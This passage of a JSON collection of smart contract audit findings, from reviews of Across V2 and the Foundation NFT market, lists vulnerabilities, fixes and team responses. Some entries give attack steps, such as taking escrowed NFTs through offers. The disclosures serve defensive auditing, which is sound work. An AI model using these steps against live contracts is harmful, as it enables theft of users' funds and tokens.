caller,`Polygon_SpokePool`,[evaluating](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/Polygon_SpokePool.sol#L140)if the token it is sending is wrapped matic in order to set the`isMatic`flag appropriately. However, for any other caller, if they forget to set this flag while sending wrapped matic, then their tokens would be unwrapped but not sent anywhere. For more predictable behavior, consider checking for wrapped matic inline rather than relying on the`isMatic`argument.\n\n\nTo avoid errors and unexpected system behavior, consider implementing require statements to validate all user-controlled input, even that of admin accounts considering that some clients may default to sending null parameters if none are specified.\n\n\n**Update**:*Fixed with[pull request #113](https://github.com/across-protocol/contracts-v2/pull/113)as of commit[`4c4928866149dcec5bd6008c5ac8050f30898b7f`](https://github.com/across-protocol/contracts-v2/pull/113/commits/4c4928866149dcec5bd6008c5ac8050f30898b7f)and[pull request #142](https://github.com/across-protocol/contracts-v2/pull/142)as of commit[`2b5cbc520415f4a2b16903504a29a9992a63d41c`](https://github.com/across-protocol/contracts-v2/pull/142/commits/2b5cbc520415f4a2b16903504a29a9992a63d41c).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10609",
      "title": "chainIdfunction is notvirtual",
      "impact": "LOW",
      "content": "Within`SpokePool.sol`, the[function`chainId`is marked`override`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L527). However,[the comments above it](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L525)indicate that the function should also be*overridable*, meaning that it should be marked`virtual`.\n\n\nConsider marking the function`virtual`to allow overriding in contracts that inherit`SpokePool`.\n\n\n**Update**:*Fixed in[pull request #82](https://github.com/across-protocol/contracts-v2/pull/82)as of commit[`cc48e5721ea444a22a84ddeeef8dcbfe191b112c`](https://github.com/across-protocol/contracts-v2/pull/82/commits/cc48e5721ea444a22a84ddeeef8dcbfe191b112c).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10608",
      "title": "whitelistedRoutesforEthereum_SpokePoolaffect other routes",
      "impact": "MEDIUM",
      "content": "When in`HubPool`s[`executeRootBundle`function](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L536), tokens are moved between spokes in order to[complete rebalances](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L560-L566)of the different spoke pools. These token transfers happen within the[`_sendTokensToChainAndUpdatePooledTokenTrackers`function](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L775), but in order to complete a rebalance the route from the`chainId`of the`HubPool`to the destination chain[must be whitelisted](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L787-L788).\n\n\nThe issue comes from the conflation of two slightly different requirements. When whitelisting a route, a combination of[origin chain, destination chain, and origin token are whitelisted](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L335). However, when rebalancing tokens, the specific route where origin chain is the`HubPool`s chain[must be whitelisted for that token and destination chain pairing](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L787).\n\n\nThis means that if other routes are to be enabled for rebalancing, the route from the`Ethereum_SpokePool`to some destination chains`SpokePool`must be enabled as well. This may allow undesired transfers to the`Ethereum_SpokePool`. Additionally, it may cause problems if some token is to be allowed to move between chains aside from Ethereum, but specifically not Ethereum. It would be impossible to disable transfers to the`Ethereum_SpokePool`without also disabling transfers between separate spoke pools for the same token.\n\n\nAlso note that[whitelisting a route](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L329-L343)does not*necessarily*whitelist the route from Ethereum to the same destination chain. This means that a separate transaction may need to be sent to enable rebalances to/from that destination, by whitelisting the Ethereum-as-origin route. This is confusing and could lead to unexpected reversions if forgotten about.\n\n\nConsider modifying the whitelist scheme so that rebalances to specific chains are automatically enabled when enabling certain routes. For example, if the route for some token to move from Arbitrum to Optimism is enabled, then the route from the Hub to Optimism should also be enabled. Additionally, consider implementing some special logic to differentiate routes from the`HubPool`and routes from the`Ethereum_SpokePool`, so that either route can be enabled independently of the other.\n\n\n**Update**:*Fixed in[pull request #89](https://github.com/across-protocol/contracts-v2/pull/89)as of commit[`2d0adf78647070e4dd20690f67f46daaa6fc82c4`](https://github.com/across-protocol/contracts-v2/pull/89/commits/2d0adf78647070e4dd20690f67f46daaa6fc82c4).*",
      "summary": "\nThe bug report is regarding the HubPool's executeRootBundle function, which is used to complete rebalances of the different spoke pools. Token transfers between spokes happen within the _sendTokensToChainAndUpdatePooledTokenTrackers function, but these transfers must be whitelisted for the route from the HubPool's chain to the destination chain. \n\nThe problem is that when whitelisting a route, a combination of origin chain, destination chain, and origin token are whitelisted, but when rebalancing tokens, the route from the HubPool's chain must be whitelisted for the token and destination chain pairing. This means that if other routes are to be enabled for rebalancing, the route from the Ethereum_SpokePool to the destination chain's SpokePool must be enabled as well, which may allow undesired transfers to the Ethereum_SpokePool. Additionally, it may be impossible to disable transfers to the Ethereum_SpokePool without also disabling transfers between separate spoke pools for the same token.\n\nThe bug has been fixed in pull request #89 as of commit 2d0adf78647070e4dd20690f67f46daaa6fc82c4. The fix suggests modifying the whitelist scheme so that rebalances to specific chains are automatically enabled when enabling certain routes. Additionally, special logic should be implemented to differentiate routes from the HubPool and routes from the Ethereum_SpokePool, so that either route can be enabled independently of the other.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10607",
      "title": "ConfusingremoveLiquiditybehavior could lock funds",
      "impact": "MEDIUM",
      "content": "The[`removeLiquidity`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L409)function in the[`HubPool`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol)contract accepts a boolean argument`sendEth`. This should be set to true[if L1 token is WETH and user wants to receive ETH](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L407).\n\n\nHowever, if the user is a smart contract, even if the L1 token is WETH and the`sendEth`argument is`true`, WETH, not ETH, will ultimately be sent back.\n\n\nThis is the case because[if`sendEth`is`true`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L422), then the[`_unwrapWETHTo`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L752)function is called. That function checks if the intended recipient is a smart contract, and, if so, sends WETH.\n\n\nIf the receiving smart contract has no mechanism to handle WETH and was only expecting ETH in return, as was explicitly specified by the`sendEth`argument submitted, then any WETH sent to such a contract could become inaccessible.\n\n\nTo avoid unnecessary confusion and the potential loss of funds, consider either reverting if a smart contract calls`removeLiquidity`with the`sendEth`argument set to`true`or modifying the`_unwrapWETHTo`function so that it can also be provided with and abide by an explicit`sendEth`argument.\n\n\n**Update**:*Fixed in[pull request #90](https://github.com/across-protocol/contracts-v2/pull/90)as of commit[`a1d1269e8a65e2b08c95c261de3d074abc57444d`](https://github.com/across-protocol/contracts-v2/pull/90/commits/a1d1269e8a65e2b08c95c261de3d074abc57444d)and[pull request #139](https://github.com/across-protocol/contracts-v2/pull/139)as of commit[`f4f87583a4af71607bacf7292fee1ffa8fc2c81d`](https://github.com/across-protocol/contracts-v2/pull/139/commits/f4f87583a4af71607bacf7292fee1ffa8fc2c81d).*",
      "summary": "\nThe bug report is about the `removeLiquidity` function in the `HubPool` contract. This function accepts a boolean argument `sendEth`. If set to true, the user should receive ETH, however if the user is a smart contract, WETH will be sent instead. This can lead to confusion and the potential loss of funds. To avoid this, consider either reverting the function if a smart contract calls it with the `sendEth` argument set to `true` or modifying the `_unwrapWETHTo` function so that it can also be provided with and abide by an explicit `sendEth` argument. The bug has since been fixed in two pull requests, #90 and #139.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10606",
      "title": "Relayers may request invalid repayments",
      "impact": "MEDIUM",
      "content": "When a relayer[fills a relay](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L371), they specify a[`repaymentChainId`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L377)to indicate which chain they want to be refunded on. However, the`repaymentChainId`is not validated against any set of acceptable values. Instead, it is included in the[`_emitFillRelay`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L400)event, which is used for generating root bundles in the system.\n\n\nSince not all tokens may exist on all chains, and some chain IDs may not exist or be a part of the Across V2 system, consider specifying valid values for`repaymentChainId`for a given token, and implementing logic similar to that for[`enabledDepositRoutes`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L58)to use for checking`repaymentChainId`. Alternatively, consider specifying in the UMIP some procedures for root bundle proposers to determine whether a`repaymentChainId`is valid, and what to do if it is not. In this case, invalid`repaymentChainId`s may mean a repayment is simply not repaid  if this is chosen, ensure that this is made very clear in any documentation about the system, so that users are not surprised by losing funds.\n\n\n**Update**:*Acknowledged. The UMA team intends to address this off-chain. They state:*\n\n\n\n> We believe that this issue can be resolved in a well-defined UMIP that lists valid repayment chain IDs (or points to where to find them), and provide a default repayment chain ID for invalid ones. For example, the UMIP could stipulate that any invalid repayment chain IDs are repaid on mainnet.\n> \n>",
      "summary": "\nThis bug report is related to the Across V2 system, which is a decentralized protocol for trading assets across multiple blockchains. The issue is that when a relayer fills a relay, they specify a `repaymentChainId` to indicate which chain they want to be refunded on, but this is not validated against any set of acceptable values. This means that if an invalid `repaymentChainId` is used, the repayment may not be made and the user could lose funds. \n\nThe UMA team has acknowledged the issue and intends to address it off-chain. They plan to create a UMIP that lists valid repayment chain IDs or points to where to find them, and provide a default repayment chain ID for invalid ones. For example, the UMIP could stipulate that any invalid repayment chain IDs are repaid on mainnet. This should help ensure that users are not surprised by losing funds due to an invalid `repaymentChainId`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10605",
      "title": "Inconsistent signature checking",
      "impact": "MEDIUM",
      "content": "Depositors can[update the relay fee](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L329)associated with their transfer by signing a message describing this intention. The message is[verified on the origin chain](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L335)before emitting the event that notifies relayers, and[verified again on the destination chain](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L438)before the new fee can be used to fill the relay. If the depositor used a static ECDSA signature and both chains support the`ecrecover`opcode, both verifications should be identical. However, verification uses the[OpenZeppelin Signature Checker](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.4/contracts/utils/cryptography/SignatureChecker.sol)library, which also supports[EIP-1271](https://eips.ethereum.org/EIPS/eip-1271)validation for smart contracts. If the smart contract validation behaves differently on the two chains, valid contract signatures may be rejected on the destination chain. A plausible example would be a multisignature wallet on the source chain that is not replicated on the destination chain.\n\n\nInstead of validating the signature on the destination chain, consider including the[`RequestedSpeedUpDeposit`event](https://github.com/across-protocol/contracts-v2/blob/5a65be1701ddf6673f42b7e06dc122bf8e1a6b0b/contracts/SpokePool.sol#L339)in the off-chain UMIP specification, so that relayers that comply with the event would be reimbursed. This mitigation would need a mechanism to handle relayers that incorrectly fill relays with excessively large relayer fees, which would prevent the recipient from receiving their full payment. Alternatively, consider removing support for EIP-1271 validation and relying entirely on ECDSA signatures.\n\n\n**Update**:*Fixed in[pull request #79](https://github.com/across-protocol/contracts-v2/pull/79)as of commit[`2a41086f0d61caf0be8c2f3d1cdaf96e4f67f718`](https://github.com/across-protocol/contracts-v2/pull/79/commits/2a41086f0d61caf0be8c2f3d1cdaf96e4f67f718).*",
      "summary": "\nThis bug report is concerning depositors who can update the relay fee associated with their transfer by signing a message describing this intention. The message is verified on the origin chain before emitting the event that notifies relayers, and verified again on the destination chain before the new fee can be used to fill the relay. The issue is that if the depositor uses a static ECDSA signature and both chains support the `ecrecover` opcode, both verifications should be identical. However, the OpenZeppelin Signature Checker library is also being used, which supports EIP-1271 validation for smart contracts. If the smart contract validation behaves differently on the two chains, valid contract signatures may be rejected on the destination chain. \n\nThe bug was fixed in pull request #79 as of commit 2a41086f0d61caf0be8c2f3d1cdaf96e4f67f718. To mitigate the issue, consider including the `RequestedSpeedUpDeposit` event in the off-chain UMIP specification so that relayers that comply with the event would be reimbursed. Alternatively, consider removing support for EIP-1271 validation and relying entirely on ECDSA signatures.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10604",
      "title": "Slow relays on multiple chains",
      "impact": "HIGH",
      "content": "In each root bundle, the[slowRelayRoot](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L63)represents all the slow relays in a batch, which could involve multiple tokens and spoke pools. A valid root bundle would ensure[the`poolRebalanceRoot`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L59)has a leaf for every spoke chain. When this rebalance leaf is processed, the`slowRelayRoot`will also be[sent to the corresponding spoke pool](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L566).\n\n\nNotably, every spoke pool receives the same`slowRelayRoot`, which represents all slow relays in the batch across the whole system. When[the slow relay is executed](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L477), the Spoke Pool does not filter on the destination chain id, which means that any slow relay can be executed on any spoke chain where the Spoke Pool has sufficient funds in the`destinationToken`. Consider including the destination chain ID in the slow relay details so the Spoke Pool can filter out relays that are intended for other chains.\n\n\n**Update**:*Fixed in[pull request #79](https://github.com/across-protocol/contracts-v2/pull/79)as of commit[`2a41086f0d61caf0be8c2f3d1cdaf96e4f67f718`](https://github.com/across-protocol/contracts-v2/pull/79/commits/2a41086f0d61caf0be8c2f3d1cdaf96e4f67f718).*",
      "summary": "\nThis bug report is about the Across Protocol's root bundle. In Across Protocol, the root bundle consists of two parts: the slowRelayRoot and the poolRebalanceRoot. The slowRelayRoot represents all the slow relays in a batch, which could involve multiple tokens and spoke pools. The poolRebalanceRoot ensures that there is a leaf for every spoke chain. When the rebalance leaf is processed, the slowRelayRoot is sent to the corresponding spoke pool. \n\nThe bug is that every spoke pool receives the same slowRelayRoot, which represents all slow relays in the batch across the whole system. When the slow relay is executed, the Spoke Pool does not filter on the destination chain id, which means that any slow relay can be executed on any spoke chain where the Spoke Pool has sufficient funds in the destinationToken. The bug was fixed in pull request #79, as of commit 2a41086f0d61caf0be8c2f3d1cdaf96e4f67f718. This fix included including the destination chain ID in the slow relay details so the Spoke Pool can filter out relays that are intended for other chains.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "42502",
      "title": "[N-07] Inconsistent Use of `sendValue()`",
      "impact": "LOW",
      "content": "\n`_buy()` should make use of `_sendValueWithFallbackWithdraw()` instead of `sendValue()`. This will ensure invalid transfers are correctly handled.\n\n**[NickCuso (Foundation) commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/89#issuecomment-1062821351):**\n > Thanks for the feedback!\n> \n>  - **[L-01] Unhandled marketLockupFor() Edge Case:** ATM there is no use case we are aware of where it would make sense for too much ETH to be provided. Because of this we are going to revert instead of refunding - it'll save a bit of gas for other users and may prevent an invalid transaction (possibly user error or a frontend bug).\n>  - **[N-01] Signature re-use:** In this use case, signature reuse is actually desirable. However after a different issue was reported we opted to remove the `adminAccountMigration` function completely instead. It's not something we have used in some time.\n>  - **[N-02] Unclear naming:** Yes, we agree. The function has been renamed.\n>  - **[N-03] Improper BASIS_POINTS Check:** This is a fair point. It's somewhat an arbitrary decision though. We are expecting values to be in BP and this logic is simply trying to handle invalid results gracefully. Either way we bring the total back down to 10% and guard against overflowing. ATM we are going to leave it as is.\n>  - **[N-04] Improper State Handling:** This is a valid concern but currently working as designed. When auto buy now applies we treat this the same as if they called buy directly. When someone purchases using `buy` we have opted to allow the highest offer to remain valid. It may not be common, but it's not 100% clear that the offer should have been canceled. e.g. the new owner may accept that offer in order to have a fast exit at a small loss due to buyers remorse.\n>  - **[N-05] No Support For ERC1155 Tokens:** Agree, we will add support for ERC-1155 at some point. It's a non trivial change though and we don't want to rush into it just yet.\n>  - **[N-06] Unclear _recipients Array Restriction:** Agree. We need some cap in order to limit amount of gas that non-creators would be required to pay. 5 is arbitrary and we should at least provide clear documentation. For now, we have added some comments about this inline. Longer term we can continue to communicate this more clearly, and encourage those with more than 5 recipients to use solutions such as https://www.0xsplits.xyz/.\n>  - **[N-07] Inconsistent Use of sendValue():** Yes, this is inconsistent. However the use case here is slightly different. Generally the use of `sendValueWithFallbackWithdraw` is when we are sending ETH to an address other than the msg.sender - we want to ensure that a malicious user cannot cause other user's transactions to revert. Here the refund is going to the msg.sender - if they are non-receivable they should be able to retry using the correct value instead. So we are leaving it as-is for now. \n\n**[Alberto Cuesta Caada (judge) commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/89#issuecomment-1070690969):**\n > Unadjusted score: 100 (80 + 20 from clean formatting)\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42501",
      "title": "[N-06] Unclear `_recipients` Array Restriction",
      "impact": "LOW",
      "content": "\nThe `_recipients` array is restricted to just 5 receivers. Ensure this is understand by NFT creators as they may intend to use additional receivers but these receivers may be disproportionally rewarded if the majority of creator shares are not included.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42500",
      "title": "[N-05] No Support For `ERC1155` Tokens",
      "impact": "LOW",
      "content": "\nMany new NFT contracts adhere to the `ERC1155` standard. Currently, it is not possible to trade these tokens on the Foundation marketplace.\n\nConsider making the necessary integrations.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42499",
      "title": "[N-04] Improper State Handling",
      "impact": "LOW",
      "content": "\nIf `_autoAcceptBuyPrice()` is executed by a new buyer that is not `offer.buyer`, then there will be an excess of `ETH`. The original `offer.buyer` will then have to wait until the offer expires as it isn't invalidated.\n\nEnsure this is understood.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42498",
      "title": "[N-03] Improper `BASIS_POINTS` Check in `_distributeFunds()`",
      "impact": "LOW",
      "content": "\nThe `_distributeFunds()` function checks if `creatorShares[i] > BASIS_POINTS` when it should actually be checking if `totalShares > BASIS_POINTS`. This ensures that the sum of creator shares do not exceed an expected amount.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42497",
      "title": "[N-02] Unclear Function Naming",
      "impact": "LOW",
      "content": "\nThe `_cancelBuyersOffer()` function isn't exactly clear as it will only cancel the offer if the buyer is `msg.sender`. Therefore, it would be more clear to rename this to `_cancelSellersOffer()` or similar to avoid confusion.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42496",
      "title": "[N-01] Signature Re-Use",
      "impact": "LOW",
      "content": "\nThe `adminAccountMigration()` function intends to allow a seller to update `auction.seller` in the event their account is compromised. However, the signature in `requireAuthorizedAccountMigration()` can be re-used because there is no use of a nonce to prevent this.\n\nConsider adding a nonce to account for this behaviour.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42495",
      "title": "[L-01] Unhandled `marketLockupFor()` Edge Case",
      "impact": "LOW",
      "content": "\n`marketLockupFor()` will revert if too much `ETH` is provided. This can be modified to refund any surplus `ETH` to the user's `FETH` balance.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42494",
      "title": "[M-15] Royalties can be distribution unfairly among `creatorRecipients` for NFT contracts with non-standard `getRoyalties()` returns",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\nBased on our research, `getRoyalties()` is not a standardized API for NFT contracts to indicate how the royalties should be distributed among the recipients.\n\nHowever, in the current implementation, it always assumes that `getRoyalties()` return in terms of BPS.\n\n[NFTMarketCreators.sol#L85-L112](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketCreators.sol#L85-L112)<br>\n\n[NFTMarketFees.sol#L86-L90](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L86-L90)<br>\n\n```solidity\nif (creatorShares[i] > BASIS_POINTS) {\n    // If the numbers are >100% we ignore the fee recipients and pay just the first instead\n    maxCreatorIndex = 0;\n    break;\n}\n```\n\nAs a result, if a particular implementation is returning `get Royalties()` with higher precision (say 1e6 for 100% instead of 1e4/BPS), the distribution of royalties can be distorted.\n\n### Proof of Concept\n\nGiven:\n\n*   `NFT-Token1` `Royalties`:\n\n    *   Address0 = 10,000 (1%)\n    *   Address1 = 10,000 (1%)\n    *   Address2 = 100,000 (10%)\n    *   Address3 = 880,000 (88%)\n\n*   Alice owns the `NFT-Token1`\n\n1.  Alice `setBuyPrice()` and listed `NFT-Token1` for `10 ETH`;\n\n2.  Bob `buy()` with `10 ETH`:\n\n*   `foundationFee` = `0.5 ETH`\n*   `creatorFee` = `1 ETH`\n*   `ownerRev` = ` 8.5 ETH  `\n\nSince `creatorShares[address2]` > `BASIS_POINTS` (10,000), all the `creatorFee` will be sent to the first address: `Address0`, which is expected to receive only `1%` of the royalties.\n\n### Recommended Mitigation Steps\n\nConsider removing this and change to:\n\n```solidity\n// Determine the total shares defined so it can be leveraged to distribute below\nuint256 totalShares;\nunchecked {\n  // The array length cannot overflow 256 bits.\n  for (uint256 i = 0; i <= maxCreatorIndex; ++i) {\n    // The check above ensures totalShares wont overflow.\n    totalShares += creatorShares[i];\n  }\n}\nif (totalShares == 0) {\n  maxCreatorIndex = 0;\n}\n```\n\n**[NickCuso (Foundation) acknowledged and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/57#issuecomment-1062150873):**\n > This is a fair concern to raise, and a reasonable solution recommendation. We will consider making a change like this in the future.\n> \n> AFAIK this API was first introduced by Manifold, which named and implemented the return value to be in basis points. It's true that since this is not a standard that others may use a different precision, however we have not yet encountered any example of that.\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the `getRoyalties()` function in NFT contracts. Currently, the function assumes that the return value is in basis points (BPS), but this may not always be the case. If a different precision is used, the distribution of royalties can be distorted. A proof of concept is provided to demonstrate the issue and a suggested solution is to change the function to calculate the total shares and distribute accordingly. The Foundation team has acknowledged the concern and will consider making changes in the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/57",
      "tags": [],
      "finders": []
    },
    {
      "id": "42493",
      "title": "[M-13] Escrowed NFT can be stolen by anyone if no active `buyPrice` or auction exists for it",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh, also found by wuwe1_\n\nIf a NFT happens to be in escrow with neither buyPrice, nor auction being initialised for it, there is a way to obtain it for free by any actor via `makeOffer`, `acceptOffer` combination.\n\nI.e. a malicious user can track the FNDNFTMarket contract and obtain any NFT from it for which there are no buyPrice or auction structures initialised. For example, if a NFT is mistakenly sent to the contract, an attacker can immediately steal it.\n\nThis will happen as NFT is being guarded by buyPrice and auction structures only. The severity here is medium as normal usage of the system imply that either one of them is initialised (NFT was sent to escrow as a part of `setBuyPrice` or `createReserveAuction`, and so one of the structures is present), so this seems to leave only mistakenly sent assets exposed.\n\n### Proof of Concept\n\nAn attacker can make a tiny offer with `makeOffer`:\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L189>\n\nThen call `acceptOffer`, which will lead to `_acceptOffer`.\n\nDirect NFT transfer will fail in `_acceptOffer` as the NFT is being held by the contract and `_transferFromEscrow` will be called instead:\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L262-L271>\n\n`_transferFromEscrow` calls will proceed according to the FNDNFTMarket defined order:\n\n    function _transferFromEscrow(\n    ...\n    ) internal override(NFTMarketCore, NFTMarketReserveAuction, NFTMarketBuyPrice, NFTMarketOffer) {\n       super._transferFromEscrow(nftContract, tokenId, recipient, seller);\n    }\n\nIf there are no corresponding structures, the NFTMarketOffer, NFTMarketBuyPrice and NFTMarketReserveAuction versions of `_transferFromEscrow` will pass through the call to NFTMarketCore's plain transfer implementation:\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCore.sol#L77-L87>\n\nThis will effectively transfer the NFT to the attacker, which will pay gas costs and an arbitrary small offer price for it.\n\n### Recommended Mitigation Steps\n\nConsider adding additional checks to control who can obtain unallocated NFTs from the contract.\n\nProtocol controlled entity can handle such cases manually by initial sender's request.\n\n**[NickCuso (Foundation) confirmed and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/51#issuecomment-1057448438):**\n > Yes, this is an interesting scenario to raise! We do have more than one NFT in the market contract which was transferred directly (vs tracked as part of escrow). So there is some exposure already.\n> \n> We feel this is a `2 (Med Risk)`:\n>  - It only impacts NFTs which were thought to be effectively burned as they were transferred to the Market contract with no way to get them back.\n>  - Presumably the NFTs which get stuck in the Market contract like that were due to user error. So in theory this could have been thought of a sort of a feature - it allows those NFTs to be recovered, which is great for the original creator which will see royalties from future sales again.\n> \n> We have fixed this. We took a slightly different approach than what was recommended, but it should accomplish the same goal. `_transferFromEscrow` changed the `seller` param to 